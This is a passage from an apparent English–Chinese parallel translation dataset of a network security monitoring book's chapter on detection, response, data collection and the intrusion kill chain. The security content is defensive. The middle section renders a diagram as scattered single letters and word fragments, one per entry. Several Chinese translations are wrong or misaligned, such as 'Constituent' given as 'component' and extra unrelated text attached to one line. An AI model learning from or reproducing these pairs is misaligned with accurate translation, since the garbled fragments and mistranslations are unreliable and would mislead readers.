  type: TYPE_NORMAL
  zh: 管理是其他旨在加强人类的对策
- en: and technical environment that also occur during the resistance phase.
  id: totrans-175
  prefs: []
  type: TYPE_NORMAL
  zh: 以及在抵抗阶段期间发生的技术环境。
- en: Unfortunately, determined intruders eventually find at least one way into
  id: totrans-176
  prefs: []
  type: TYPE_NORMAL
  zh: 不幸的是，决心强烈的入侵者最终会找到至少一种进入方式
- en: a network, which makes the next two phases of the enterprise security
  id: totrans-177
  prefs: []
  type: TYPE_NORMAL
  zh: 一个网络，这使得企业安全的下两个阶段变得至关重要。
- en: cycle—detection and response—mandatory.
  id: totrans-178
  prefs: []
  type: TYPE_NORMAL
  zh: 周期—检测与响应—是强制性的。
- en: '***The Detection and Response Phases***'
  id: totrans-179
  prefs: []
  type: TYPE_NORMAL
  zh: '***检测与响应阶段***'
- en: 'The detection and response phases include three elements of NSM: collect,'
  id: totrans-180
  prefs: []
  type: TYPE_NORMAL
  zh: 检测与响应阶段包括NSM的三个元素：收集、
- en: analyze, and escalate. A fourth element, resolve, is part of the response
  id: totrans-181
  prefs: []
  type: TYPE_NORMAL
  zh: 分析和升级。第四个元素，解决，是响应
- en: phase, but Figure 9-1 shows this particular element closer to the planning
  id: totrans-182
  prefs: []
  type: TYPE_NORMAL
  zh: 阶段，但图9-1显示这一元素更靠近规划
- en: element of the enterprise security cycle.
  id: totrans-183
  prefs: []
  type: TYPE_NORMAL
  zh: 企业安全周期的一个元素。
- en: The detection and response phases of the enterprise security cycle are
  id: totrans-184
  prefs: []
  type: TYPE_NORMAL
  zh: 企业安全周期的检测与响应阶段是
- en: at the heart of NSM, and they are the reason analysts perform collection,
  id: totrans-185
  prefs: []
  type: TYPE_NORMAL
  zh: 在NSM的核心，他们是分析师执行收集、
- en: analysis, and escalation to detect and respond to intrusions. Accordingly,
  id: totrans-186
  prefs: []
  type: TYPE_NORMAL
  zh: 分析，并升级以检测和响应入侵。因此，
- en: they deserve their own diagram showing how the various elements work
  id: totrans-187
  prefs: []
  type: TYPE_NORMAL
  zh: 它们值得拥有自己的图表，展示各个元素如何协同工作
- en: together. Figure 9-2 depicts that relationship, and the following section
  id: totrans-188
  prefs: []
  type: TYPE_NORMAL
  zh: 一起。图9-2描述了这种关系，接下来的部分
- en: explains these elements in more detail.
  id: totrans-189
  prefs: []
  type: TYPE_NORMAL
  zh: 解释这些元素的更多细节。
- en: NSM Operations **187**
  id: totrans-190
  prefs: []
  type: TYPE_NORMAL
  zh: NSM操作 **187**
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-191
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: DETECTION
  id: totrans-192
  prefs: []
  type: TYPE_NORMAL
  zh: 检测
- en: RESPONSE
  id: totrans-193
  prefs: []
  type: TYPE_NORMAL
  zh: 响应
- en: Collection
  id: totrans-194
  prefs: []
  type: TYPE_NORMAL
  zh: 收集
- en: Analysis
  id: totrans-195
  prefs: []
  type: TYPE_NORMAL
  zh: 分析
- en: Escalation
  id: totrans-196
  prefs: []
  type: TYPE_NORMAL
  zh: 升级
- en: Resolution
  id: totrans-197
  prefs: []
  type: TYPE_NORMAL
  zh: 解决
- en: Host data
  id: totrans-198
  prefs: []
  type: TYPE_NORMAL
  zh: 主机数据
- en: Constituent
  id: totrans-199
  prefs: []
  type: TYPE_NORMAL
  zh: 成分
- en: C
  id: totrans-200
  prefs: []
  type: TYPE_NORMAL
  zh: C
- en: A
  id: totrans-201
  prefs: []
  type: TYPE_NORMAL
  zh: A
- en: A
  id: totrans-202
  prefs: []
  type: TYPE_NORMAL
  zh: A
- en: notification
  id: totrans-203
  prefs: []
  type: TYPE_NORMAL
  zh: 通知
- en: O
  id: totrans-204
  prefs: []
  type: TYPE_NORMAL
  zh: O
- en: IOC-centric
  id: totrans-205
  prefs: []
  type: TYPE_NORMAL
  zh: IOC中心
- en: Constituent
  id: totrans-206
  prefs: []
  type: TYPE_NORMAL
  zh: 成分
- en: N
  id: totrans-207
  prefs: []
  type: TYPE_NORMAL
  zh: N
- en: N
  id: totrans-208
  prefs: []
  type: TYPE_NORMAL
  zh: N
- en: N
  id: totrans-209
  prefs: []
  type: TYPE_NORMAL
  zh: N
- en: Net data
  id: totrans-210
  prefs: []
  type: TYPE_NORMAL
  zh: 网络数据
- en: response
  id: totrans-211
  prefs: []
  type: TYPE_NORMAL
  zh: 响应
- en: A
  id: totrans-212
  prefs: []
  type: TYPE_NORMAL
  zh: A
- en: analysis, or
  id: totrans-213
  prefs: []
  type: TYPE_NORMAL
  zh: 分析，或
- en: A
  id: totrans-214
  prefs: []
  type: TYPE_NORMAL
  zh: A
- en: S
  id: totrans-215
  prefs: []
  type: TYPE_NORMAL
  zh: S
- en: L
  id: totrans-216
  prefs: []
  type: TYPE_NORMAL
  zh: L
- en: L
  id: totrans-217
  prefs: []
  type: TYPE_NORMAL
  zh: L
- en: T
  id: totrans-218
  prefs: []
  type: TYPE_NORMAL
  zh: T
- en: Y
  id: totrans-219
  prefs: []
  type: TYPE_NORMAL
  zh: Y
- en: “matching”
  id: totrans-220
  prefs: []
  type: TYPE_NORMAL
  zh: “匹配”
- en: Y
  id: totrans-221
  prefs: []
  type: TYPE_NORMAL
  zh: Y
- en: New IOC
  id: totrans-222
  prefs: []
  type: TYPE_NORMAL
  zh: 新的IOC
- en: I
  id: totrans-223
  prefs: []
  type: TYPE_NORMAL
  zh: I
- en: Application
  id: totrans-224
  prefs: []
  type: TYPE_NORMAL
  zh: 应用
- en: Additional
  id: totrans-225
  prefs: []
  type: TYPE_NORMAL
  zh: 额外的
- en: S
  id: totrans-226
  prefs: []
  type: TYPE_NORMAL
  zh: S
- en: S
  id: totrans-227
  prefs: []
  type: TYPE_NORMAL
  zh: S
- en: creation
  id: totrans-228
  prefs: []
  type: TYPE_NORMAL
  zh: 创建
- en: T
  id: totrans-229
  prefs: []
  type: TYPE_NORMAL
  zh: T
- en: T
  id: totrans-230
  prefs: []
  type: TYPE_NORMAL
  zh: T
- en: T
  id: totrans-231
  prefs: []
  type: TYPE_NORMAL
  zh: T
- en: logs
  id: totrans-232
  prefs: []
  type: TYPE_NORMAL
  zh: 日志
- en: response
  id: totrans-233
  prefs: []
  type: TYPE_NORMAL
  zh: 响应
- en: UE
  id: totrans-234
  prefs: []
  type: TYPE_NORMAL
  zh: UE
- en: C
  id: totrans-235
  prefs: []
  type: TYPE_NORMAL
  zh: C
- en: C
  id: totrans-236
  prefs: []
  type: TYPE_NORMAL
  zh: C
- en: New
  id: totrans-237
  prefs: []
  type: TYPE_NORMAL
  zh: 新的
- en: N
  id: totrans-238
  prefs: []
  type: TYPE_NORMAL
  zh: N
- en: O
  id: totrans-239
  prefs: []
  type: TYPE_NORMAL
  zh: O
- en: O
  id: totrans-240
  prefs: []
  type: TYPE_NORMAL
  zh: O
- en: T
  id: totrans-241
  prefs: []
  type: TYPE_NORMAL
  zh: T
- en: Data from
  id: totrans-242
  prefs: []
  type: TYPE_NORMAL
  zh: 来自
- en: Collection
  id: totrans-243
  prefs: []
  type: TYPE_NORMAL
  zh: 收集
- en: N
  id: totrans-244
  prefs: []
  type: TYPE_NORMAL
  zh: N
- en: N
  id: totrans-245
  prefs: []
  type: TYPE_NORMAL
  zh: N
- en: collection
  id: totrans-246
  prefs: []
  type: TYPE_NORMAL
  zh: 收集
- en: S
  id: totrans-247
  prefs: []
  type: TYPE_NORMAL
  zh: S
- en: S
  id: totrans-248
  prefs: []
  type: TYPE_NORMAL
  zh: S
- en: P
  id: totrans-249
  prefs: []
  type: TYPE_NORMAL
  zh: P
- en: third party
  id: totrans-250
  prefs: []
  type: TYPE_NORMAL
  zh: 第三方
- en: improvement
  id: totrans-251
  prefs: []
  type: TYPE_NORMAL
  zh: 改进
- en: O
  id: totrans-252
  prefs: []
  type: TYPE_NORMAL
  zh: O
- en: IOC-free
  id: totrans-253
  prefs: []
  type: TYPE_NORMAL
  zh: IOC自由
- en: O
  id: totrans-254
  prefs: []
  type: TYPE_NORMAL
  zh: O
- en: requirement
  id: totrans-255
  prefs: []
  type: TYPE_NORMAL
  zh: 要求
- en: O
  id: totrans-256
  prefs: []
  type: TYPE_NORMAL
  zh: O
- en: L
  id: totrans-257
  prefs: []
  type: TYPE_NORMAL
  zh: L
- en: L
  id: totrans-258
  prefs: []
  type: TYPE_NORMAL
  zh: L
- en: analysis, or
  id: totrans-259
  prefs: []
  type: TYPE_NORMAL
  zh: 分析，或
- en: R
  id: totrans-260
  prefs: []
  type: TYPE_NORMAL
  zh: R
- en: E
  id: totrans-261
  prefs: []
  type: TYPE_NORMAL
  zh: E
- en: E
  id: totrans-262
  prefs: []
  type: TYPE_NORMAL
  zh: E
- en: T
  id: totrans-263
  prefs: []
  type: TYPE_NORMAL
  zh: T
- en: Data from
  id: totrans-264
  prefs: []
  type: TYPE_NORMAL
  zh: 来自
- en: Analysis
  id: totrans-265
  prefs: []
  type: TYPE_NORMAL
  zh: 分析
- en: (S)
  id: totrans-266
  prefs: []
  type: TYPE_NORMAL
  zh: (S)
- en: “hunting”
  id: totrans-267
  prefs: []
  type: TYPE_NORMAL
  zh: “狩猎”
- en: (S) New analysis
  id: totrans-268
  prefs: []
  type: TYPE_NORMAL
  zh: (S) 新分析
- en: A
  id: totrans-269
  prefs: []
  type: TYPE_NORMAL
  zh: A
- en: requirement
  id: totrans-270
  prefs: []
  type: TYPE_NORMAL
  zh: 要求
- en: L
  id: totrans-271
  prefs: []
  type: TYPE_NORMAL
  zh: L
- en: constituent
  id: totrans-272
  prefs: []
  type: TYPE_NORMAL
  zh: 成分
- en: improvement
  id: totrans-273
  prefs: []
  type: TYPE_NORMAL
  zh: 改进
- en: Event observed/
  id: totrans-274
  prefs: []
  type: TYPE_NORMAL
  zh: 事件观察/
- en: Identification
  id: totrans-275
  prefs: []
  type: TYPE_NORMAL
  zh: 识别
- en: Validation
  id: totrans-276
  prefs: []
  type: TYPE_NORMAL
  zh: 验证
- en: Documentation
  id: totrans-277
  prefs: []
  type: TYPE_NORMAL
  zh: 文档
- en: Notification
  id: totrans-278
  prefs: []
  type: TYPE_NORMAL
  zh: 通知
- en: Ack
  id: totrans-279
  prefs: []
  type: TYPE_NORMAL
  zh: 确认
- en: Containment
  id: totrans-280
  prefs: []
  type: TYPE_NORMAL
  zh: 阻断
- en: Remediation
  id: totrans-281
  prefs: []
  type: TYPE_NORMAL
  zh: 修复
- en: stored
  id: totrans-282
  prefs: []
  type: TYPE_NORMAL
  zh: 存储
- en: Request more data
  id: totrans-283
  prefs: []
  type: TYPE_NORMAL
  zh: 请求更多数据
- en: '*Figure 9-2: NSM process*'
  id: totrans-284
  prefs: []
  type: TYPE_NORMAL
  zh: '*图9-2：NSM流程*'
- en: '**collection, analysis, escalation, and resolution**'
  id: totrans-285
  prefs: []
  type: TYPE_NORMAL
  zh: '**收集、分析、升级和解决**'
- en: 'The detection and response phases include the following elements:'
  id: totrans-286
  prefs: []
  type: TYPE_NORMAL
  zh: 检测和响应阶段包括以下元素：
- en: '**Collection** Gathering the data we need to decide whether activity is'
  id: totrans-287
  prefs: []
  type: TYPE_NORMAL
  zh: '**收集** 收集我们需要的数据，以决定活动是否'
- en: normal, suspicious, or malicious.
  id: totrans-288
  prefs: []
  type: TYPE_NORMAL
  zh: 正常、可疑或恶意。
- en: '**Analysis** The process of validating what we suspect about the nature'
  id: totrans-289
  prefs: []
  type: TYPE_NORMAL
  zh: '**分析** 验证我们对活动性质的怀疑的过程'
- en: 'of an event. As Figure 9-2 shows, there are two types of analysis: that'
  id: totrans-290
  prefs: []
  type: TYPE_NORMAL
  zh: 事件的过程。如图9-2所示，有两种类型的分析：其中之一
- en: which is focused on indicators of compromise (IOCs), and that which
  id: totrans-291
  prefs: []
  type: TYPE_NORMAL
  zh: 主要关注妥协指示器（IOC），以及
- en: is not. (IOCs are discussed in “Analysis” o[n page 193\.](#p227) )
  id: totrans-292
  prefs: []
  type: TYPE_NORMAL
  zh: 否则就是不行。（IOC在“分析”部分讨论：[第193页](#p227)）
- en: '**Escalation** The act of notifying a constituent about the status of a'
  id: totrans-293
  prefs: []
  type: TYPE_NORMAL
  zh: '**升级** 通知利益相关者有关事件状态的行为'
- en: compromised asset. (I advocate using the term constituent because
  id: totrans-294
  prefs: []
  type: TYPE_NORMAL
  zh: 被入侵的资产。（我主张使用“利益相关者”这个术语，因为
- en: it captures the theme that those the CIRT serves have a “vote” in the
  id: totrans-295
  prefs: []
  type: TYPE_NORMAL
  zh: 它捕捉了CIRT服务对象在
- en: CIRT’s operations, because constituents own the computers monitored
  id: totrans-296
  prefs: []
  type: TYPE_NORMAL
  zh: CIRT的操作，因为利益相关者拥有被监控的计算机
- en: by the CIRT.)
  id: totrans-297
  prefs: []
  type: TYPE_NORMAL
  zh: （由CIRT负责。）
- en: '**Resolution** The action taken by a constituent or security team mem-'
  id: totrans-298
  prefs: []
  type: TYPE_NORMAL
  zh: '**解决** 利益相关者或安全团队成员采取的行动，'
- en: ber to reduce the risk of loss.
  id: totrans-299
  prefs: []
  type: TYPE_NORMAL
  zh: 以减少丢失风险的安全团队成员。
- en: As with the diagram of the enterprise security cycle in Figure 9-1, the
  id: totrans-300
  prefs: []
  type: TYPE_NORMAL
  zh: 就像图9-1中的企业安全周期图一样，
- en: workflow in Figure 9-2 appears orderly and linear, but that’s typically not
    the
  id: totrans-301
  prefs: []
  type: TYPE_NORMAL
  zh: 图9-2中的工作流看起来有序且线性，但实际上通常不是这样
- en: case in real life. In fact, all phases of the detection and response processes
  id: totrans-302
  prefs: []
  type: TYPE_NORMAL
  zh: 实际生活中的案例。事实上，检测和响应的所有阶段
- en: may occur at the same time. Sometimes, multiple incidents are occurring;
  id: totrans-303
  prefs: []
  type: TYPE_NORMAL
  zh: 可能同时发生。有时，多个事件同时发生；
- en: other times, the same incident occupies all four stages at once. Figure 9-2
  id: totrans-304
  prefs: []
  type: TYPE_NORMAL
  zh: 其他时候，同一个事件会占据所有四个阶段。图9-2
- en: shows that detection is composed of collection and analysis, and response
  id: totrans-305
  prefs: []
  type: TYPE_NORMAL
  zh: 显示检测由收集和分析组成，响应
- en: includes escalation and resolution. Let’s take a closer look at each of these
  id: totrans-306
  prefs: []
  type: TYPE_NORMAL
  zh: 包括升级和解决。让我们仔细看看这些
- en: elements.
  id: totrans-307
  prefs: []
  type: TYPE_NORMAL
  zh: 元素。
- en: '**188** Chapter 9'
  id: totrans-308
  prefs: []
  type: TYPE_NORMAL
  zh: '**188** 第9章'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-309
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '***Collection***'
  id: totrans-310
  prefs: []
  type: TYPE_NORMAL
  zh: '***收集***'
- en: Collection includes various processes that gather information, both techni-
  id: totrans-311
  prefs: []
  type: TYPE_NORMAL
  zh: 收集包括各种收集信息的过程，既有技术性-
- en: 'cal and nontechnical:'
  id: totrans-312
  prefs: []
  type: TYPE_NORMAL
  zh: 技术性和非技术性：
- en: '**Technical processes** Involves gathering data from endpoints or hosts'
  id: totrans-313
  prefs: []
  type: TYPE_NORMAL
  zh: '**技术过程**涉及从端点或主机收集数据'
- en: (such as computers, servers, tablets, mobile devices, and so on), the net-
  id: totrans-314
  prefs: []
  type: TYPE_NORMAL
  zh: （例如计算机、服务器、平板电脑、移动设备等），网络-
- en: work, and logs (created by applications, devices, and related sources).
  id: totrans-315
  prefs: []
  type: TYPE_NORMAL
  zh: 工作和日志（由应用程序、设备及相关源创建）。
- en: '**Nontechnical collection processes** Includes recording input from'
  id: totrans-316
  prefs: []
  type: TYPE_NORMAL
  zh: '**非技术性收集过程**包括记录来自'
- en: third parties (outsiders like partners, law enforcement, intelligence
  id: totrans-317
  prefs: []
  type: TYPE_NORMAL
  zh: 第三方（如合作伙伴、执法机关、情报
- en: agencies, and so on) and constituents.
  id: totrans-318
  prefs: []
  type: TYPE_NORMAL
  zh: 机构等）和利益相关者的“投票”主题。
- en: '**technical Sources**'
  id: totrans-319
  prefs: []
  type: TYPE_NORMAL
  zh: '**技术来源**'
- en: One way to gather data from hosts is to use a commercial enterprise-class
  id: totrans-320
  prefs: []
  type: TYPE_NORMAL
  zh: 收集主机数据的一种方式是使用商业级企业解决方案
- en: platform like Mandiant for Intelligent Response (MIR, *http://www.mandiant*
  id: totrans-321
  prefs: []
  type: TYPE_NORMAL
  zh: 类似Mandiant智能响应（MIR，*http://www.mandiant*
- en: '*.com/products/mandiant-platform/intelligent-response/*), which asks questions
    of endpoints via software. MIR enables CIRTs to *sweep* the enterprise for signs'
  id: totrans-322
  prefs: []
  type: TYPE_NORMAL
  zh: '*.com/products/mandiant-platform/intelligent-response/*）平台，通过软件对端点提出问题。MIR使得CIRT能够*扫查*企业，寻找入侵的迹象'
- en: of intruder activity, and then conduct targeted analysis of potential victim
  id: totrans-323
  prefs: []
  type: TYPE_NORMAL
  zh: 入侵者活动的阶段，然后对潜在受害者进行有针对性的分析
- en: computers. Other options include the commercial version of F-Response
  id: totrans-324
  prefs: []
  type: TYPE_NORMAL
  zh: 计算机。其他选择包括F-Response的商业版本
- en: ( *http://www.f-response.com/*), which allows basic remote access to hard drives
    and memory, as well as native Windows tools such as Windows Management
  id: totrans-325
  prefs: []
  type: TYPE_NORMAL
  zh: （*http://www.f-response.com/*），允许基本的远程访问硬盘和内存，以及Windows Management等原生Windows工具
- en: Instrumentation Command-line (WMIC) and SysInternals PsExec.2
  id: totrans-326
  prefs: []
  type: TYPE_NORMAL
  zh: 工具命令行（WMIC）和SysInternals PsExec.2
- en: Network-centric collection is the focus of this book. The network access
  id: totrans-327
  prefs: []
  type: TYPE_NORMAL
  zh: 网络为中心的收集是本书的重点。网络访问
- en: methods discussed in Chapter 2, along with the platforms described in
  id: totrans-328
  prefs: []
  type: TYPE_NORMAL
  zh: 第2章中讨论的方法，以及所描述的平台
- en: Part II, and the tools introduced in Part III, combine to offer network-
  id: totrans-329
  prefs: []
  type: TYPE_NORMAL
  zh: 第二部分和第三部分介绍的工具结合提供了网络-
- en: derived data to analysts. Additional layers of interpretation transform raw
  id: totrans-330
  prefs: []
  type: TYPE_NORMAL
  zh: 从原始数据中派生的分析结果。附加的解释层次将原始数据转化为
- en: network information into indicators that merit attention.
  id: totrans-331
  prefs: []
  type: TYPE_NORMAL
  zh: 将网络信息转化为值得关注的指标。
- en: Application logs are a primary source of technical data in the collection
  id: totrans-332
  prefs: []
  type: TYPE_NORMAL
  zh: 应用日志是收集中的主要技术数据来源
- en: phase, and any application or device that generates them can provide valu-
  id: totrans-333
  prefs: []
  type: TYPE_NORMAL
  zh: 阶段，并且生成日志的任何应用程序或设备都可以提供有价值的
- en: able information. Output from an antivirus agent and the Apache process
  id: totrans-334
  prefs: []
  type: TYPE_NORMAL
  zh: 可用信息。来自杀毒软件代理和 Apache 进程的输出
- en: on a web server are examples of application logs.
  id: totrans-335
  prefs: []
  type: TYPE_NORMAL
  zh: Web 服务器上的应用日志就是应用日志的例子。
- en: 'Log collection requires at least the following:'
  id: totrans-336
  prefs: []
  type: TYPE_NORMAL
  zh: 日志收集至少需要以下内容：
- en: • A *log source* that creates application data
  id: totrans-337
  prefs: []
  type: TYPE_NORMAL
  zh: • 一个*日志源*，用于创建应用程序数据
- en: • A *log collector* that accepts and stores the data
  id: totrans-338
  prefs: []
  type: TYPE_NORMAL
  zh: • 一个*日志收集器*，用于接收和存储数据
- en: • A *transport method* to move the logs from the source to the collector
  id: totrans-339
  prefs: []
  type: TYPE_NORMAL
  zh: • 一个*传输方法*，用于将日志从源头传输到收集器
- en: For example, ELSA might collect logs from a proxy server, with Syslog
  id: totrans-340
  prefs: []
  type: TYPE_NORMAL
  zh: 例如，ELSA 可能会从代理服务器收集日志，使用 Syslog
- en: acting as the transport method.
  id: totrans-341
  prefs: []
  type: TYPE_NORMAL
  zh: 充当传输方法。
- en: Host data differs from application logs in that host data is often acquired
  id: totrans-342
  prefs: []
  type: TYPE_NORMAL
  zh: 主机数据不同于应用日志，因为主机数据通常是通过
- en: on demand, while logs are created by a regularly scheduled process. Using
  id: totrans-343
  prefs: []
  type: TYPE_NORMAL
  zh: 按需提供，而日志是由定期调度的过程创建的。使用
- en: MIR, for example, you can remotely query for host data like a mutex in
  id: totrans-344
  prefs: []
  type: TYPE_NORMAL
  zh: 例如，MIR，你可以远程查询主机数据，比如 Windows 中的互斥锁
- en: memory or an artifact in the Windows Registry. This concept of interrogat-
  id: totrans-345
  prefs: []
  type: TYPE_NORMAL
  zh: 内存或 Windows 注册表中的工件。这个询问的概念
- en: ing computers for specific indicators of compromise (IOCs, discussed in
  id: totrans-346
  prefs: []
  type: TYPE_NORMAL
  zh: 寻找特定的妥协指示符（IOC，见下文讨论）
- en: “Analysis” o[n page 193](#p227)) is a powerful host-centric technique.
  id: totrans-347
  prefs: []
  type: TYPE_NORMAL
  zh: “分析”o[第193页](#p227)）是一种强大的以主机为中心的技术。
- en: '2\. Mike Pilkington’s posts to the SANS forensics blog are especially helpful:
    *http://*'
  id: totrans-348
  prefs: []
  type: TYPE_NORMAL
  zh: 2\. Mike Pilkington 在 SANS 法医博客上的帖子特别有帮助：*http://*
- en: '*computer-forensics.sans.org/blog/author/mpilkington*.'
  id: totrans-349
  prefs: []
  type: TYPE_NORMAL
  zh: '*computer-forensics.sans.org/blog/author/mpilkington*。'
- en: NSM Operations **189**
  id: totrans-350
  prefs: []
  type: TYPE_NORMAL
  zh: NSM 操作 **189**
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-351
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '**Nontechnical Sources**'
  id: totrans-352
  prefs: []
  type: TYPE_NORMAL
  zh: '**非技术来源**'
- en: Nontechnical sources can be even more important to the success of the
  id: totrans-353
  prefs: []
  type: TYPE_NORMAL
  zh: 非技术来源对于成功至关重要，
- en: NSM process. For example, the 2013 edition of the Mandiant M-Trends
  id: totrans-354
  prefs: []
  type: TYPE_NORMAL
  zh: NSM 过程。例如，Mandiant M-Trends 2013 版
- en: report ( *http://www.mandiant.com/resources/m-trends/*) noted that organiza-
  id: totrans-355
  prefs: []
  type: TYPE_NORMAL
  zh: 报告（*http://www.mandiant.com/resources/m-trends/*）指出，组织
- en: tions received warning of intrusions from external parties two-thirds of the
  id: totrans-356
  prefs: []
  type: TYPE_NORMAL
  zh: 组织接收到来自外部方的入侵警告，占三分之二的比例
- en: time; only one-third of the time did they discover the event themselves.
  id: totrans-357
  prefs: []
  type: TYPE_NORMAL
  zh: 时间；只有三分之一的时间他们能自己发现事件。
- en: When identifying an event using internal sources, reports from users
  id: totrans-358
  prefs: []
  type: TYPE_NORMAL
  zh: 在使用内部来源识别事件时，来自用户的报告
- en: are often crucial. Users trained to be aware of phishing activity can be a
  id: totrans-359
  prefs: []
  type: TYPE_NORMAL
  zh: 常常至关重要。经过钓鱼活动意识培训的用户可以成为
- en: key aspect of enterprise defense. The user who reports a failed phishing
  id: totrans-360
  prefs: []
  type: TYPE_NORMAL
  zh: 企业防御的关键方面。报告钓鱼攻击失败的用户
- en: attempt may provide the warning and evidence needed to detect when that
  id: totrans-361
  prefs: []
  type: TYPE_NORMAL
  zh: 尝试可能提供需要的警告和证据，以便在该
- en: same attempt succeeded against another victim.
  id: totrans-362
  prefs: []
  type: TYPE_NORMAL
  zh: 同样的攻击对另一个受害者成功。
- en: '**whaT DaTa ShoulD you collecT?**'
  id: totrans-363
  prefs: []
  type: TYPE_NORMAL
  zh: '**你应该收集哪些数据？**'
- en: This book recommends collecting several classes of network-centric data . This
  id: totrans-364
  prefs: []
  type: TYPE_NORMAL
  zh: 本书建议收集几类以网络为中心的数据。这
- en: NSM data includes full content, extracted content, session data, transaction
  id: totrans-365
  prefs: []
  type: TYPE_NORMAL
  zh: NSM 数据包括完整内容、提取内容、会话数据、交易
- en: data, statistical data, metadata, and alert data . Is al that necessary? How
  id: totrans-366
  prefs: []
  type: TYPE_NORMAL
  zh: 数据、统计数据、元数据和警报数据。所有这些都必要吗？如何
- en: should a CIRT decide what data to col ect to improve its chances of detecting
  id: totrans-367
  prefs: []
  type: TYPE_NORMAL
  zh: 如果 CIRT 决定收集哪些数据以提高其检测成功的概率，
- en: and responding to all sorts of digital intruders?
  id: totrans-368
  prefs: []
  type: TYPE_NORMAL
  zh: 并应对各种数字入侵者？
- en: Eric M . Hutchins, Michael J . Cloppert, and Rohan M . Amin offer one model
  id: totrans-369
  prefs: []
  type: TYPE_NORMAL
  zh: Eric M . Hutchins、Michael J . Cloppert 和 Rohan M . Amin 提出了一个模型
- en: to help answer this question in their landmark paper “Intel igence-Driven Com-
  id: totrans-370
  prefs: []
  type: TYPE_NORMAL
  zh: 帮助回答这个问题的论文中，“基于情报的计算机网络防御”。
- en: puter Network Defense Informed by Analysis of Adversary Campaigns and
  id: totrans-371
  prefs: []
  type: TYPE_NORMAL
  zh: 计算机网络防御通过对敌对行动分析得出的
- en: Intrusion Kill Chains” ( *ht p://papers.rohanamin.com/wp-content/uploads/papers*
  id: totrans-372
  prefs: []
  type: TYPE_NORMAL
  zh: 入侵杀伤链”（*http://papers.rohanamin.com/wp-content/uploads/papers*
- en: '*.rohanamin.com/2011/08/iciw2011.pdf* ) . In this paper (and in talks at conferences),
    they outline the steps an intruder takes when exercising a certain set of'
  id: totrans-373
  prefs: []
  type: TYPE_NORMAL
  zh: '*.rohanamin.com/2011/08/iciw2011.pdf*。在这篇论文中（以及会议上的演讲中），他们概述了入侵者在实施某一套'
- en: tactics, techniques, and procedures (TTPs, a term borrowed from the US military
  id: totrans-374
  prefs: []
  type: TYPE_NORMAL
  zh: 战术、技术和程序（TTPs，这是一个借用自美国军方的术语）
- en: to characterize intruder activity) . Although the authors developed their model
    to
  id: totrans-375
  prefs: []
  type: TYPE_NORMAL
  zh: 用于描述入侵者活动）尽管作者开发了他们的模型，以
- en: counter advanced persistent threat (APT) TTPs,
  id: totrans-376
  prefs: []
  type: TYPE_NORMAL
  zh: 对抗高级持续性威胁（APT）的TTP，
- en: this general form of analysis can be adapted to
  id: totrans-377
  prefs: []
  type: TYPE_NORMAL
  zh: 这种一般形式的分析可以适应
- en: Intrusion Kill Chain
  id: totrans-378
  prefs: []
  type: TYPE_NORMAL
  zh: 入侵杀链
- en: suit other actors and other methods . (For more
  id: totrans-379
  prefs: []
  type: TYPE_NORMAL
  zh: 适用于其他行动者和其他方法。（更多信息请参考
- en: information on the APT, see Mandiant’s report at
  id: totrans-380
  prefs: []
  type: TYPE_NORMAL
  zh: 关于APT的信息，请参见 Mandiant 的报告：
- en: Reconnaissance
  id: totrans-381
  prefs: []
  type: TYPE_NORMAL
  zh: 侦察
- en: '*ht p://www.mandiant.com/apt1/* .) Their model'
  id: totrans-382
  prefs: []
  type: TYPE_NORMAL
  zh: '*http://www.mandiant.com/apt1/*。）他们的模型'
- en: appears in Figure 9-3, and is referenced in
  id: totrans-383
  prefs: []
  type: TYPE_NORMAL
  zh: 如图 9-3 所示，并在其中引用
- en: Weaponization
  id: totrans-384
  prefs: []
  type: TYPE_NORMAL
  zh: 武器化
- en: their paper as an *intrusion kil chain* .
  id: totrans-385
  prefs: []
  type: TYPE_NORMAL
  zh: 他们的论文作为*入侵杀链*。
- en: Delivery
  id: totrans-386
  prefs: []
  type: TYPE_NORMAL
  zh: 交付
- en: This series of steps resembles the process
  id: totrans-387
  prefs: []
  type: TYPE_NORMAL
  zh: 这一系列步骤类似于
- en: discussed in previous works, such as the “phases
  id: totrans-388
  prefs: []
  type: TYPE_NORMAL
  zh: 之前的研究中讨论过的内容，比如“阶段
- en: Exploitation
  id: totrans-389
  prefs: []
  type: TYPE_NORMAL
  zh: 利用
- en: of compromise” in my first book *The Tao of*
  id: totrans-390
  prefs: []
  type: TYPE_NORMAL
  zh: “攻陷的解剖”出自我的第一本书*The Tao of*
- en: '*Network Security Monitoring: Beyond Intrusion*'
  id: totrans-391
  prefs: []
  type: TYPE_NORMAL
  zh: '*网络安全监控：超越入侵*'
- en: Installation
  id: totrans-392
  prefs: []
  type: TYPE_NORMAL
  zh: 安装
- en: '*Detection* (Addison-Wesley, 2004): (1) recon-'
  id: totrans-393
  prefs: []
  type: TYPE_NORMAL
  zh: '*检测*（Addison-Wesley，2004年）：（1）侦察-'
- en: Command and control
  id: totrans-394
  prefs: []
  type: TYPE_NORMAL
  zh: 命令与控制
- en: naissance, (2) exploitation, (3) reinforce-
  id: totrans-395
  prefs: []
  type: TYPE_NORMAL
  zh: 侦察，（2）利用，（3）强化-
- en: ment, (4) consolidation, and (5) pil age . The
  id: totrans-396
  prefs: []
  type: TYPE_NORMAL
  zh: （4）整合，（5）掠夺。这个
- en: Actions on intent
  id: totrans-397
  prefs: []
  type: TYPE_NORMAL
  zh: 基于意图的操作
- en: “anatomy of a hack” from *Hacking Exposed,*
  id: totrans-398
  prefs: []
  type: TYPE_NORMAL
  zh: 《黑客攻击的解剖》来自于*Hacking Exposed*，
- en: '*Fourth Edition* (McGraw-Hill Osborne Media,'
  id: totrans-399
  prefs: []
  type: TYPE_NORMAL
  zh: '*第四版*（麦格劳-希尔奥斯本媒体，'
- en: '*Figure 9-3: Intrusion kill*'
  id: totrans-400
  prefs: []
  type: TYPE_NORMAL
  zh: '*图 9-3：入侵杀链*'
- en: '2003) is similar: (1) footprinting, (2) scanning,'
  id: totrans-401
  prefs: []
  type: TYPE_NORMAL
  zh: 2003年）类似：（1）足迹分析，（2）扫描，
- en: '*chain model*'
  id: totrans-402
  prefs: []
  type: TYPE_NORMAL
